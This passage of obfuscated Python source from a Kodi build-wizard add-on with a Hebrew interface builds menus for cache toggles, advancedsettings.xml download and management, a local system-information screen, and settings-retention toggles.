		addFile ('--- Include All Video Addons: %s'%OO0OOO00000OO0000 .replace ('true',OOOOO0O0OO0OO0OOO ).replace ('false',OOOOO00OO00OO0O00 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2913
		addFile ('--- Include Bob: %s'%O000OO0000O0OOOOO .replace ('true',OOOOO0O0OO0OO0OOO ).replace ('false',OOOOO00OO00OO0O00 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2914
		addFile ('--- Include Phoenix: %s'%O0OOOO0O0OOO0O000 .replace ('true',OOOOO0O0OO0OO0OOO ).replace ('false',OOOOO00OO00OO0O00 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2915
		addFile ('--- Include Specto: %s'%O00OOOO00O0O00OO0 .replace ('true',OOOOO0O0OO0OO0OOO ).replace ('false',OOOOO00OO00OO0O00 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2916
		addFile ('--- Include Exodus: %s'%OO0O000O0000000OO .replace ('true',OOOOO0O0OO0OO0OOO ).replace ('false',OOOOO00OO00OO0O00 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2917
		addFile ('--- Include Salts: %s'%OO0OOOOOO0O00OO00 .replace ('true',OOOOO0O0OO0OO0OOO ).replace ('false',OOOOO00OO00OO0O00 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2918
		addFile ('--- Include Salts HD Lite: %s'%O0O0000OOO00OO00O .replace ('true',OOOOO0O0OO0OO0OOO ).replace ('false',OOOOO00OO00OO0O00 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2919
		addFile ('--- Include One Channel: %s'%O0O0OOOOOO00O0O00 .replace ('true',OOOOO0O0OO0OO0OOO ).replace ('false',OOOOO00OO00OO0O00 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2920
		addFile ('--- Include Genesis: %s'%O00OOO00O0O00O0O0 .replace ('true',OOOOO0O0OO0OO0OOO ).replace ('false',OOOOO00OO00OO0O00 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2921
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2922
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2923
	setView ('files','viewType')#line:2924
def advancedWindow (url =None ):#line:2926
	if not ADVANCEDFILE =='http://':#line:2927
		if url ==None :#line:2928
			O00O00OO0O0OO0O00 =wiz .workingURL (ADVANCEDFILE )#line:2929
			OO0O00O0000O00OO0 =uservar .ADVANCEDFILE #line:2930
		else :#line:2931
			O00O00OO0O0OO0O00 =wiz .workingURL (url )#line:2932
			OO0O00O0000O00OO0 =url #line:2933
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2934
		if os .path .exists (ADVANCED ):#line:2935
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2936
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2937
		if O00O00OO0O0OO0O00 ==True :#line:2938
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2939
			OO000OOOOO00O0OO0 =wiz .openURL (OO0O00O0000O00OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2940
			O00000O0O0O00O00O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO000OOOOO00O0OO0 )#line:2941
			if len (O00000O0O0O00O00O )>0 :#line:2942
				for O0OOO00OOOOOO000O ,OO00O0O0OO00OOO00 ,url ,O000OOOO000OOOO00 ,OOO0O00000OO0OO0O ,O000000OO0O0O000O in O00000O0O0O00O00O :#line:2943
					if OO00O0O0OO00OOO00 .lower ()=="yes":#line:2944
						addDir ("[B]%s[/B]"%O0OOO00OOOOOO000O ,'advancedsetting',url ,description =O000000OO0O0O000O ,icon =O000OOOO000OOOO00 ,fanart =OOO0O00000OO0OO0O ,themeit =THEME3 )#line:2945
					else :#line:2946
						addFile (O0OOO00OOOOOO000O ,'writeadvanced',O0OOO00OOOOOO000O ,url ,description =O000000OO0O0O000O ,icon =O000OOOO000OOOO00 ,fanart =OOO0O00000OO0OO0O ,themeit =THEME2 )#line:2947
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2948
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O00O00OO0O0OO0O00 )#line:2949
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2950
def writeAdvanced (OO0O0O00OO0O0OOOO ,O0000O0OO00OO000O ):#line:2952
	OOOOO0O00O0OOOOO0 =wiz .workingURL (O0000O0OO00OO000O )#line:2953
	if OOOOO0O00O0OOOOO0 ==True :#line:2954
		if os .path .exists (ADVANCED ):O00OO0OOO0OO0OO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO0O0O00OO0O0OOOO ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2955
		else :O00OO0OOO0OO0OO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO0O0O00OO0O0OOOO ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2956
		if O00OO0OOO0OO0OO0O ==1 :#line:2958
			O0OOO000O00OO00O0 =wiz .openURL (O0000O0OO00OO000O )#line:2959
			OOO00O00OOOO0OO0O =open (ADVANCED ,'w');#line:2960
			OOO00O00OOOO0OO0O .write (O0OOO000O00OO00O0 )#line:2961
			OOO00O00OOOO0OO0O .close ()#line:2962
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2963
			wiz .killxbmc (True )#line:2964
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2965
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OOOOO0O00O0OOOOO0 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2966
def viewAdvanced ():#line:2968
	O0OOO000OO00O000O =open (ADVANCED )#line:2969
	O0OOOOO00OOO0OO00 =O0OOO000OO00O000O .read ().replace ('\t','    ')#line:2970
	wiz .TextBox (ADDONTITLE ,O0OOOOO00OOO0OO00 )#line:2971
	O0OOO000OO00O000O .close ()#line:2972
def removeAdvanced ():#line:2974
	if os .path .exists (ADVANCED ):#line:2975
		wiz .removeFile (ADVANCED )#line:2976
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2977
def showAutoAdvanced ():#line:2979
	notify .autoConfig ()#line:2980
def getIP ():#line:2982
	OO0O0O00OO00O000O ='http://whatismyipaddress.com/'#line:2983
	if not wiz .workingURL (OO0O0O00OO00O000O ):return 'Unknown','Unknown','Unknown'#line:2984
	O0000OO0OOO00OO0O =wiz .openURL (OO0O0O00OO00O000O ).replace ('\n','').replace ('\r','')#line:2985
	if not 'Access Denied'in O0000OO0OOO00OO0O :#line:2986
		OO0O00000OOOO00OO =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O0000OO0OOO00OO0O )#line:2987
		O000OOO0O00000O0O =OO0O00000OOOO00OO [0 ]if (len (OO0O00000OOOO00OO )>0 )else 'Unknown'#line:2988
		O000O0OO0O0O0OOOO =re .compile ('"font-size:14px;">(.+?)</td>').findall (O0000OO0OOO00OO0O )#line:2989
		OOO0O0O0OO0OO0000 =O000O0OO0O0O0OOOO [0 ]if (len (O000O0OO0O0O0OOOO )>0 )else 'Unknown'#line:2990
		O0OO0OO0OO00O0OOO =O000O0OO0O0O0OOOO [1 ]+', '+O000O0OO0O0O0OOOO [2 ]+', '+O000O0OO0O0O0OOOO [3 ]if (len (O000O0OO0O0O0OOOO )>2 )else 'Unknown'#line:2991
		return O000OOO0O00000O0O ,OOO0O0O0OO0OO0000 ,O0OO0OO0OO00O0OOO #line:2992
	else :return 'Unknown','Unknown','Unknown'#line:2993
def systemInfo ():#line:2995
	O00O000OOOOO0OOOO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3009
	OOOO00OOOOOOO0OOO =[];O0O0O000OO0O00000 =0 #line:3010
	for OOOO0O0OOO00000O0 in O00O000OOOOO0OOOO :#line:3011
		O0OOOOO0OOO0000O0 =wiz .getInfo (OOOO0O0OOO00000O0 )#line:3012
		O0OOO0O00O0O00OO0 =0 #line:3013
		while O0OOOOO0OOO0000O0 =="Busy"and O0OOO0O00O0O00OO0 <10 :#line:3014
			O0OOOOO0OOO0000O0 =wiz .getInfo (OOOO0O0OOO00000O0 );O0OOO0O00O0O00OO0 +=1 ;wiz .log ("%s sleep %s"%(OOOO0O0OOO00000O0 ,str (O0OOO0O00O0O00OO0 )));xbmc .sleep (1000 )#line:3015
		OOOO00OOOOOOO0OOO .append (O0OOOOO0OOO0000O0 )#line:3016
		O0O0O000OO0O00000 +=1 #line:3017
	O0OO0O000O0000000 =OOOO00OOOOOOO0OOO [8 ]if 'Una'in OOOO00OOOOOOO0OOO [8 ]else wiz .convertSize (int (float (OOOO00OOOOOOO0OOO [8 ][:-8 ]))*1024 *1024 )#line:3018
	OOO000000OO00OOOO =OOOO00OOOOOOO0OOO [9 ]if 'Una'in OOOO00OOOOOOO0OOO [9 ]else wiz .convertSize (int (float (OOOO00OOOOOOO0OOO [9 ][:-8 ]))*1024 *1024 )#line:3019
	OO0OOO0OOO0OOOO0O =OOOO00OOOOOOO0OOO [10 ]if 'Una'in OOOO00OOOOOOO0OOO [10 ]else wiz .convertSize (int (float (OOOO00OOOOOOO0OOO [10 ][:-8 ]))*1024 *1024 )#line:3020
	OOO0000O0OO000O00 =wiz .convertSize (int (float (OOOO00OOOOOOO0OOO [11 ][:-2 ]))*1024 *1024 )#line:3021
	OO000O00OOOO00O00 =wiz .convertSize (int (float (OOOO00OOOOOOO0OOO [12 ][:-2 ]))*1024 *1024 )#line:3022
	OOO00O000OO0O0OO0 =wiz .convertSize (int (float (OOOO00OOOOOOO0OOO [13 ][:-2 ]))*1024 *1024 )#line:3023
	O0OO0OOO0O00O0OO0 ,O0OOO0OO0O0OO0OOO ,O0O0O0OO00OOOOOOO =getIP ()#line:3024
	O000OO00O0OOOO0O0 =[];O0O0O00OO0OOO00O0 =[];O0OOOOOOOO0000O00 =[];OO0O000O0O0OO0O0O =[];O000OO0O0OOOOOO00 =[];O0OOOO000O00O000O =[];O0OO0O00O0O00OO00 =[]#line:3026
	OOO00OO0O0O0000O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3028
	for OOOO0OO00OO000OOO in sorted (OOO00OO0O0O0000O0 ,key =lambda OOOO000O0OO00OO00 :OOOO000O0OO00OO00 ):#line:3029
		O00OOOOO000O00O00 =os .path .split (OOOO0OO00OO000OOO [:-1 ])[1 ]#line:3030
		if O00OOOOO000O00O00 =='packages':continue #line:3031
		O0O0OOOO0OO0OO0O0 =os .path .join (OOOO0OO00OO000OOO ,'addon.xml')#line:3032
		if os .path .exists (O0O0OOOO0OO0OO0O0 ):#line:3033
			O0O0OOOO0000O00OO =open (O0O0OOOO0OO0OO0O0 )#line:3034
			O00OO0OOOOO000O0O =O0O0OOOO0000O00OO .read ()#line:3035
			O00O0OO00OOO0O00O =re .compile ("<provides>(.+?)</provides>").findall (O00OO0OOOOO000O0O )#line:3036
			if len (O00O0OO00OOO0O00O )==0 :#line:3037
				if O00OOOOO000O00O00 .startswith ('skin'):O0OO0O00O0O00OO00 .append (O00OOOOO000O00O00 )#line:3038
				if O00OOOOO000O00O00 .startswith ('repo'):O000OO0O0OOOOOO00 .append (O00OOOOO000O00O00 )#line:3039
				else :O0OOOO000O00O000O .append (O00OOOOO000O00O00 )#line:3040
			elif not (O00O0OO00OOO0O00O [0 ]).find ('executable')==-1 :OO0O000O0O0OO0O0O .append (O00OOOOO000O00O00 )#line:3041
			elif not (O00O0OO00OOO0O00O [0 ]).find ('video')==-1 :O0OOOOOOOO0000O00 .append (O00OOOOO000O00O00 )#line:3042
			elif not (O00O0OO00OOO0O00O [0 ]).find ('audio')==-1 :O0O0O00OO0OOO00O0 .append (O00OOOOO000O00O00 )#line:3043
			elif not (O00O0OO00OOO0O00O [0 ]).find ('image')==-1 :O000OO00O0OOOO0O0 .append (O00OOOOO000O00O00 )#line:3044
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3046
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO00OOOOOOO0OOO [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3047
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO00OOOOOOO0OOO [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3048
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3049
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO00OOOOOOO0OOO [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3050
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO00OOOOOOO0OOO [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3051
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3053
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO00OOOOOOO0OOO [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3054
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO00OOOOOOO0OOO [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3055
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0O000O0000000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3058
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO000000OO00OOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3059
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOO0OOO0OOOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3060
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0000O0OO000O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3063
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O00OOOO00O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3064
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O000OO0O0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3065
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3067
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO00OOOOOOO0OOO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3068
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0OOO0O00O0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3069
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0OO0O0OO0OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3070
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0O0OO00OOOOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3071
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO00OOOOOOO0OOO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3072
	O0OO0000O0O00O0O0 =len (O000OO00O0OOOO0O0 )+len (O0O0O00OO0OOO00O0 )+len (O0OOOOOOOO0000O00 )+len (OO0O000O0O0OO0O0O )+len (O0OOOO000O00O000O )+len (O0OO0O00O0O00OO00 )+len (O000OO0O0OOOOOO00 )#line:3074
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O0OO0000O0O00O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3075
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOOOOOOO0000O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3076
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O000O0O0OO0O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3077
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0O00OO0OOO00O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3078
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000OO00O0OOOO0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3079
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000OO0O0OOOOOO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3080
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OO0O00O0O00OO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3081
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOOO000O00O000O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3082
def Menu ():#line:3083
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3084
def saveMenu ():#line:3086
	O0OO0O0000OO0O0O0 ='[COLOR yellow]מופעל[/COLOR]';OOOO0O0000000O000 ='[COLOR blue]מבוטל[/COLOR]'#line:3088
	O00000000OO0OO0OO ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3089
	OOO00O0OOO0000000 ='true'if KEEPMOVIELIST =='true'else 'false'#line:3090
	O0OOOOO00O0OOOO0O ='true'if KEEPINFO =='true'else 'false'#line:3091
	O00OO00000OO00O00 ='true'if KEEPSOUND =='true'else 'false'#line:3093
	O0OOO00O000OOOOOO ='true'if KEEPVIEW =='true'else 'false'#line:3094
	O0O0OOO00OOOO00OO ='true'if KEEPSKIN =='true'else 'false'#line:3095
	O00OOOO00OOO0O0O0 ='true'if KEEPSKIN2 =='true'else 'false'#line:3096
	OOOO00O0O000O0OOO ='true'if KEEPSKIN3 =='true'else 'false'#line:3097
	OOO000O00O00O0OO0 ='true'if KEEPADDONS =='true'else 'false'#line:3098
	OO0000O0O00OOO00O ='true'if KEEPPVR =='true'else 'false'#line:3099
	O0OOOOOOO0000O00O ='true'if KEEPTVLIST =='true'else 'false'#line:3100
	O0O000OO000O00000 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3101
	OOO0000OO0O0O00OO ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3102
	OO0OO0OOOOOOO000O ='true'if KEEPHUBTV =='true'else 'false'#line:3103
	OOO0O0000OO00O000 ='true'if KEEPHUBVOD =='true'else 'false'#line:3104
	OOO00O0O00OOOO00O ='true'if KEEPHUBSPORT =='true'else 'false'#line:3105
	OOO000O0O00O0O00O ='true'if KEEPHUBKIDS =='true'else 'false'#line:3106
	OOO000O0O00O00000 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3107
	O0OO00O0OO0OOO0O0 ='true'if KEEPHUBMENU =='true'else 'false'#line:3108
	OO0OO00O000O0OO0O ='true'if KEEPPLAYLIST =='true'else 'false'#line:3109
	OO0O0O0000OOO00O0 ='true'if KEEPTRAKT =='true'else 'false'#line:3110
	OOO0OOOO0OOO0OO0O ='true'if KEEPREAL =='true'else 'false'#line:3111
	OOOOO00OO000O0000 ='true'if KEEPRD2 =='true'else 'false'#line:3112
	OOO00O0OO0O0O00O0 ='true'if KEEPTORNET =='true'else 'true'#line:3113
	O0O00O00OO0OOO0O0 ='true'if KEEPLOGIN =='true'else 'false'#line:3114
	O0O0OO0OOO00O00O0 ='true'if KEEPSOURCES =='true'else 'false'#line:3115
	OOO00OO00000OOO0O ='true'if KEEPADVANCED =='true'else 'false'#line:3116
	OO00OO00O00000OO0 ='true'if KEEPPROFILES =='true'else 'false'#line:3117
	OO000O00O0OOO0O0O ='true'if KEEPFAVS =='true'else 'false'#line:3118
	OO0OO00O000OOO0O0 ='true'if KEEPREPOS =='true'else 'false'#line:3119
	O0OOO00O00O000O0O ='true'if KEEPSUPER =='true'else 'false'#line:3120
	OO0OOO0OOOO0OO000 ='true'if KEEPWHITELIST =='true'else 'false'#line:3121
	O0000O0O000OOOO0O ='true'if KEEPWEATHER =='true'else 'false'#line:3122
	O0000O0O0O00OO0OO ='true'if KEEPVICTORY =='true'else 'false'#line:3123
	O0000O0O00OO00000 ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3124
	if OO0OOO0OOOO0OO000 =='true':#line:3126
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3127
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3128
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3129
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3130
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3131
	addFile ('%s שמירת חשבון RD:  '%OOO0OOOO0OOO0OO0O .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3134
	addFile ('%s שמירת חשבון טראקט:  '%OO0O0O0000OOO00O0 .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3135
	addFile ('%s שמירת מועדפים:  '%OO000O00O0OOO0O0O .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3138
	addFile ('%s שמירת לקוח טלוויזיה:  '%OO0000O0O00OOO00O .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3139
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O0000O0O0O00OO0OO .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3140
	addFile ('%s שמירת חשבון טלמדיה:  '%O0000O0O00OO00000 .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3141
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O0OOOOOOO0000O00O .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת אריח סרטים:  '%O0O000OO000O00000 .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת אריח סדרות:  '%OOO0000OO0O0O00OO .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3144
	addFile ('%s שמירת אריח טלויזיה:  '%OO0OO0OOOOOOO000O .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3145
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OOO0O0000OO00O000 .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3146
	addFile ('%s שמירת אריח ספורט:  '%OOO00O0O00OOOO00O .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3147
	addFile ('%s שמירת אריח ילדים:  '%OOO000O0O00O0O00O .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3148
	addFile ('%s שמירת אריח מוסיקה:  '%OOO000O0O00O00000 .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3149
	addFile ('%s שמירת תפריט אריחים ראשי:  '%O0OO00O0OO0OOO0O0 .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3150
	addFile ('%s שמירת כל האריחים בסקין:  '%O0O0OOO00OOOO00OO .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3151
	addFile ('%s שמירת הגדרות מזג האוויר:  '%O0000O0O000OOOO0O .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3152
	addFile ('%s שמירת הרחבות שהתקנתי:  '%OOO000O00O00O0OO0 .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3158
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%O0OOOOO00O0OOOO0O .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3159
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OOO00O0OOO0000000 .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3162
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%O0O0OO0OOO00O00O0 .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3163
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O00OO00000OO00O00 .replace ('true',O0OO0O0000OO0O0O0 ).replace ('false',OOOO0O0000000O000 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3164
